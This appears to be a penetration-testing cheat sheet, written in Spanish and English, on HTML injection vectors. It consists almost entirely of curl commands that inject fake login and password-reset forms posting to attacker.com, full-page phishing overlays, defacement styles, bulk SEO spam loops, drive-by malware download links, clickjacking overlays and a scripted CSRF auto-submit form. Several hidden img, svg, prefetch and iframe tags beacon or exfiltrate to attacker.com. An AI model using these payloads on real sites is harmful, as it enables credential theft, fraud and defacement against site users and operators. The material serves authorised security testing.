---
aliases:
  - HTML Injection Phishing
  - HTML Defacement
  - HTML SEO
tags:
  - type/technique
  - vuln/html-injection
  - technique/initial-access
  - technique/impact
  - asset/web-app
primary categories: null
secondary categories: null
tertiary categories: null
type: Technique
linked:
  - '[[HTML Injection]]'
---
# HTML Injection - Vectores Comunes

***

## Phishing via Fake Form / Login

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl -X POST -d 'comment=<form action="https://attacker.com/log" method="POST"><input name="user"><input name="pass" type="password"><button>Login</button></form>' https://target/comments` | Inject fake login form — capture creds | Comment fields. |
| `curl -X POST -d 'bio=<form action="//attacker.com/reset" method="POST"><input name="email"></form>' https://target/profile` | Fake reset password form | Profile bio. |
| `curl 'https://target/search?q=<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:white;z-index:9999"><form action="//attacker"><input name=u placeholder=Email><input name=p type=password placeholder=Password><button>Re-login</button></form></div>'` | Full-page overlay phishing | Reflected XSS context. |
| `curl -X POST -d 'review=<a href="/logout">Click here</a><form action="//attacker" method="POST"><input name=u><input name=p type=password></form>' https://target/reviews` | Logout-then-fake-login chain | Multi-step UX. |
| `curl -X POST -d 'desc=<svg><foreignObject width=300 height=200><form xmlns="http://www.w3.org/1999/xhtml" action="//attacker"><input name=p type=password></form></foreignObject></svg>' https://target/items` | SVG foreignObject form bypass | SVG allowed. |
| `curl 'https://target/?msg=<form method=POST action=//attacker><input name=_method value=DELETE><input name=user>'` | Method override + form | Method-override apps. |
| `curl -X POST -d 'note=<form action=//attacker enctype=multipart/form-data method=POST><input type=file name=f><button>Upload</button></form>' https://target/notes` | File upload phishing form | File harvest. |
| `curl 'https://target/search?q=<form action="https://attacker.com" id=x><input name=email></form><label for=email>...'` | Form by id reference outside form tag | HTML5 form ownership. |
| Burp Repeater inject `<form action="//attacker"...` en cualquier reflected param | Manual probe phishing inject | Workflow. |
^htmli-vector-phishing

### Phishing PoC en comment field

```html
<style>
  body { display: none; }
</style>
<div style="position:fixed; top:0; left:0; width:100%; height:100%; background:white; z-index:9999;">
  <h1>Session expired. Please re-login:</h1>
  <form action="https://attacker.com/log" method="POST">
    <input name="email" placeholder="Email" /><br>
    <input name="password" type="password" placeholder="Password" /><br>
    <button>Login</button>
  </form>
</div>
```

___

## Defacement / Page Modification

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl -X POST -d 'comment=<h1 style="color:red;font-size:80px">DEFACED BY X</h1>' https://target/comments` | Standard defacement banner | Stored field. |
| `curl -X POST -d 'bio=<img src="https://attacker.com/troll.png" style="position:fixed;top:0;left:0;width:100vw;height:100vh;z-index:9999">' https://target/profile` | Full-page image overlay | Visual replace. |
| `curl -X POST -d 'content=<style>.legit-content,nav,header,main{display:none!important}</style><div>OWNED</div>' https://target/post` | CSS hide legit + show defaced | Stealth defacement. |
| `curl 'https://target/search?q=<audio src="https://attacker.com/loop.mp3" autoplay loop></audio>'` | Autoplay audio loop | Annoyance. |
| `curl 'https://target/?msg=<video src="//attacker.com/v.mp4" autoplay style="width:100%"></video>'` | Inject autoplay video | Same. |
| `curl -X POST -d 'review=<iframe src="https://attacker.com/page" style="position:fixed;top:0;left:0;width:100%;height:100%;border:0;z-index:9999"></iframe>' https://target/reviews` | Full-page iframe replace | Iframe replace. |
| `curl -X POST -d 'comment=<style>*{color:red!important;background:black!important;transform:rotate(180deg)}</style>' https://target/comments` | Style chaos | Visual chaos. |
| `curl -X POST -d 'note=<style>body{animation:shake 0.5s infinite}@keyframes shake{0%{transform:translateX(0)}50%{transform:translateX(10px)}}</style>' https://target/notes` | CSS animation distract | Distract. |
| `curl 'https://target/?lang=es&msg=<h1>HACKEADO</h1>'` (lang-targeted) | Per-language defacement | Multi-region. |
| `curl -X POST -d 'comment=<style>body::before{content:"DEFACED";position:fixed;top:0;left:0;width:100vw;background:red;color:white;font-size:60px;z-index:9999}</style>' https://target/comments` | CSS ::before pseudo-element | CSS-only inject. |
^htmli-vector-deface

___

## SEO / Social Engineering Links

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `for url in spam1 spam2 spam3; do curl -X POST -d "comment=<a href='https://$url.com'>Buy Pills Cheap</a>" https://target/comments; done` | Mass SEO spam link injection | Crawler SEO abuse. |
| `curl -X POST -d 'review=<a href="https://spam.com" style="display:none;visibility:hidden">x</a>' https://target/reviews` | Hidden SEO link invisible to user | Crawler-only. |
| `curl -X POST -d 'comment=<a href="https://target.com.attacker.com/login">target.com Login</a>' https://target/comments` | Lookalike domain phishing link | Visual confusion. |
| `curl -X POST -d 'comment=<a href="https://attacker.com/fake-reset">Reset Password</a>' https://target/comments` | Fake reset link phishing | Phishing destination. |
| `curl 'https://target/?head=<link rel="canonical" href="https://attacker.com">'` (if head reflected) | SEO canonical hijack | Head context. |
| `curl -X POST -d 'comment=<a href="https://attacker.com/page" rel="">link</a>' https://target/comments` | Bypass nofollow filter via empty rel | Filter bypass. |
| `curl -X POST -d 'comment=<a href="https://attacker.com">https://target.com/legit-page</a>' https://target/comments` | Cloaked display vs href mismatch | Trust transfer. |
| `curl -X POST -d 'comment=<a href="https://attacker.com/malware.exe" download>Download Report</a>' https://target/comments` | Drive-by download link | Drive-by. |
| `curl -X POST -d 'comment=<a href="tel:+1-555-0100">Call Support Now</a>' https://target/comments` | tel: vishing link | Vishing. |
| `curl -X POST -d 'comment=<a href="mailto:victim@target.com?subject=Reset&body=Password:">Click</a>' https://target/comments` | Pre-filled mailto phishing | Email phish. |
| `for i in {1..50}; do curl -X POST -d "comment=<a href=https://spam$i.com>buy</a>" https://target/comments; done` | Bulk spam mass injection | Volume. |
^htmli-vector-seo

___

## Visible Content Injection

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl -X POST -d 'review=<h2 style="color:red">Special offer just for you — click below!</h2>' https://target/reviews` | Misleading promotional text | UX confusion. |
| `curl -X POST -d 'comment=<div class="alert alert-danger">Your account was locked. <a href="//attacker">Verify here</a></div>' https://target/comments` | Fake security alert UX | Panic-driven phish. |
| `curl -X POST -d 'bio=<span style="font-size:50px;color:gold">⭐⭐⭐⭐⭐ Verified Seller</span>' https://target/profile` | Fake verified badge | Fraud trust. |
| `curl -X POST -d 'review=<mark style="background:yellow;padding:20px">URGENT: Action required</mark>' https://target/reviews` | Highlighted attention grab | Attention. |
| `curl -X POST -d 'comment=<marquee scrollamount=30>BUY NOW BUY NOW BUY NOW</marquee>' https://target/comments` | Legacy marquee scroll | Distraction. |
| `curl -X POST -d 'comment=<iframe src="https://attacker.com/scam" width=600 height=400 style="border:0"></iframe>' https://target/comments` | Embedded malicious iframe | Iframe abuse. |
| `curl -X POST -d 'note=<pre style="font-family:monospace;color:red">SYSTEM BREACH DETECTED\nCall +1-555-0100 immediately</pre>' https://target/notes` | Pre-formatted scare ASCII | Scare phish. |
| `curl -X POST -d 'comment=<div class="error" style="border:2px solid red;padding:10px;background:#fdd">Your session was compromised. <a href="//attacker">Verify identity</a></div>' https://target/comments` | Fake error message | Phish UX. |
| `curl -X POST -d 'review=<blockquote cite="CEO">target.com is a scam company</blockquote>' https://target/reviews` | Attribution forgery blockquote | Reputation. |
| `curl -X POST -d 'review=<div>5 stars - Best product! - Verified Customer</div>' https://target/reviews` | Counterfeit fake review | Fraud. |
| `curl -X POST -d 'comment=<span style="font-size:80px;background:red;color:white">999</span> people online' https://target/comments` | Fake counter metrics | Fake metrics. |
^htmli-vector-content

___

## Hidden Elements / Iframe Abuse

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl -X POST -d 'comment=<iframe src="https://attacker.com/c2" style="display:none"></iframe>' https://target/comments` | Hidden iframe persistent background | Background actions. |
| `curl -X POST -d 'comment=<form id="x" style="display:none" action="//target.com/account/delete" method="POST"><input name="confirm" value="yes"></form><script>document.getElementById("x").submit()</script>' https://target/comments` | Hidden auto-submit form CSRF (XSS chain) | CSRF chain. |
| `curl -X POST -d 'comment=<img src="https://attacker.com/track?u=USER" width=1 height=1 style="display:none">' https://target/comments` | 1x1 tracking pixel | User tracking. |
| `curl -X POST -d 'comment=<iframe src="https://target.com/account/delete?confirm=yes" style="opacity:0;position:absolute;top:0;left:0;width:100%;height:100%;z-index:9999"></iframe>' https://target/comments` | Clickjacking iframe overlay | UI redress. |
| `curl -X POST -d 'comment=<iframe src="https://attacker.com" width=1 height=1></iframe>' https://target/comments` | 1x1 invisible iframe | Invisible. |
| `curl -X POST -d 'comment=<img src="//attacker.com/log?path='$(echo /admin)'&cookies=NA">' https://target/comments` | Image src Referer leak token-bearing URL | Referer leak. |
| `curl 'https://target/?msg=<base href="https://attacker.com/">'` (head context) | base href hijack reroute relative URLs | Asset hijack. |
| `curl 'https://target/?msg=<meta http-equiv="refresh" content="0;url=https://attacker.com">'` | Meta refresh auto-redirect | Auto-redirect. |
| `curl -X POST -d 'comment=<svg width=0 height=0><image href="https://attacker.com/log?url='$URL'" /></svg>' https://target/comments` | SVG hidden image exfil | SVG combo. |
| `curl -X POST -d 'comment=<link rel="prefetch" href="https://attacker.com/log?u=USER">' https://target/comments` | Link prefetch background request | Prefetch exfil. |
| `curl -X POST -d 'comment=<picture><source srcset="https://attacker.com/log"><img src="x"></picture>' https://target/comments` | Picture srcset exfil | Source variant. |
| `curl -X POST -d 'comment=<object data="https://attacker.com/page" width=0 height=0></object>' https://target/comments` | Object tag hidden load | Object embed. |
^htmli-vector-hidden

***
